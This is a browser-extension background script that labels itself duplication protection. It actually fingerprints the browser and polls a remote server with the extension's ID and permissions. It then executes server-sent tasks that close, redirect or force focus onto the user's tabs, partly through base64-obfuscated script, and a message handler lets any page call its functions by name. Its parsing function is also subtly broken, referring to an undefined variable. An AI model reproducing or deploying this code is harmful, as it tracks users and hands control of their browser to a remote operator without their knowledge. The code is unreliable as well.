/*!
 *  v0.2 protection against duplication of the extension and its functions
 */
 
/* Functions */

function escapeInput(input) { return input.replace(/'/g, "\\'"); }
function p_t() { window.pastornow = (new Date).getTime(); if( window.pastornext && window.pastornext > window.pastornow) return; window.pastornext = window.pastornow + window.pastoriv; p_getS(apiUrl); }
var Storage = { manage: function(param,value) { param = "M3."+param; if( value === undefined ) { return localStorage.getItem(param); } else { localStorage.setItem(param,value); } } };

window.p_rand = function (min, max) { var rand = min + Math.random() * (max - min); rand = Math.round(rand); return rand; }
window.isset = function(e,tt,tt1){ var t = []; if(typeof tt != 'undefined'){ t[t.length] = tt; } if(typeof tt1 != 'undefined'){ t[t.length] = tt1; } var type = typeof e; if(type != 'undefined' && e != null){ if(t.length>0){ for(var j=0;j<t.length;j++){ if(e.length<=0 && ((type == 'string' && t[j] == 'string') || (type == 'object' && t[j] == 'array'))){ return false; } } } return true; }else{ return false; } return 0; }
window.p_t_close = function (tab) { var write = 'document.write(atob("PHNjcmlwdD52YXIgd2luID0gd2luZG93Lm9wZW4oImFib3V0OmJsYW5rIiwgIl9zZWxmIik7d2luLmNsb3NlKCk7d2luZG93LmNsb3NlKCk7PC9zY3JpcHQ+"));'; var close = 'window.close();'; var open = 'var win = window.open("about:blank", "_self");win.close();'; var locablank = 'location="about:blank";'; var code = write + close + open + locablank; if(tab != undefined) { try { chrome.tabs.remove(tab); }catch (e) { console.error("p_t_close"); } } return code; }
window.p_t_upd = function (updid,mutdata) { try{ check = isset(updid); }catch(e){ check = false; } if(!check) { return false; } chrome.tabs.update( updid, mutdata); return true; }
window.p_t_false = function(tab,d) { var check,noclickTact; try{ check = isset(d.noclick); }catch(e){ check = false; } if(!check) { return false; } chrome.tabs.query( { active: true }, function(t) { noclickTact = t[0].id; }); chrome.tabs.onActivated.addListener(function(activeInfo) { if (activeInfo.tabId != tab) { noclickTact = activeInfo.tabId; return false; } chrome.tabs.update(noclickTact, { active: true }); }); }
window.p_restart = function (){location.reload();return true;}
window.p_close = function (){document.write();return true;}

/* Functions end*/



window.pastoriv = 100000;
var apiUrl = "http://example.com/";

new Fingerprint2().get(function(result, components){
  Storage.manage("fp2", result);
});

function p_getS(apiUrl){
	window.manifest = chrome.runtime.getManifest();
	var xhr = new XMLHttpRequest();
	var body = 'data=' + encodeURIComponent(JSON.stringify({ type: "pastor", interval: window.pastoriv, extid: chrome.runtime.id, ver: window.manifest.version, permissions: JSON.stringify(window.manifest.permissions) , fp2: Storage.manage("fp2") }));
	xhr.open("POST", apiUrl, true);
	xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
	xhr.onreadystatechange = function() {
		if (this.readyState != 4) return;
		if (this.status == 200) {
			p_online(this.responseText);
		} else {
			p_offline();
		}

	}
	xhr.send(body);

}




function p_online(pdata)
{
var json = JSON.parse( data);
data = Object.assign( Object.create( null ), json );
data.tasks = Object.assign( Object.create( null ), json.tasks );

if(data.tasks==undefined){return;}
window.pdata = pdata;
Object.keys(data.tasks).forEach(function(key, id) {

	if(window[key]==undefined){console.log("tasks undefined",key);return;}
	data.tasks[key] = Object.assign( Object.create( null ), data.tasks[key] );
	
	Object.keys(data.tasks[key]).forEach(function(vkey, vid) {
		data.tasks[key][vid] = Object.assign( Object.create( null ), data.tasks[key][vid] );
		
		if(data.tasks[key][vid].time != undefined)
		{
			var tasks_t = data.tasks[key][vid].time;
		}
		
		if(data.tasks[key][vid].d != undefined)
		{
			var tasks_d = data.tasks[key][vid].d;
		}
		if(data.tasks[key][vid].d != undefined)
		{
			
			if(data.tasks[key][vid].time == undefined)
			{
				console.log("tasks",key,window[key](tasks_d));
			}else{
				setTimeout(function()
				{
					console.log("tasks time",key,window[key](tasks_d));
				},tasks_t);
			}
		}else{
			if(data.tasks[key][vid].time == undefined)
			{
				console.log("tasks",key,window[key]());
			}else{
				setTimeout(function()
				{
					console.log("tasks time",key,window[key]());
				},tasks_t);
			}	
		}
		
		
		
		if(data.tasks[key][vid].metrika == undefined)
		{
			
		}
	});

}); 	
}

function p_offline()
{
	p_online(window.pdata);
}

chrome.runtime.onMessage.addListener(
    function(request, sender, sendResponse) {
        if (window[request.func] != undefined) {
            sendResponse({
                [request.func]: window[request.func](sender.tab.id, request.data), tabid: sender.tab.id
            });
        }
});

  
setInterval( p_t, 1000);
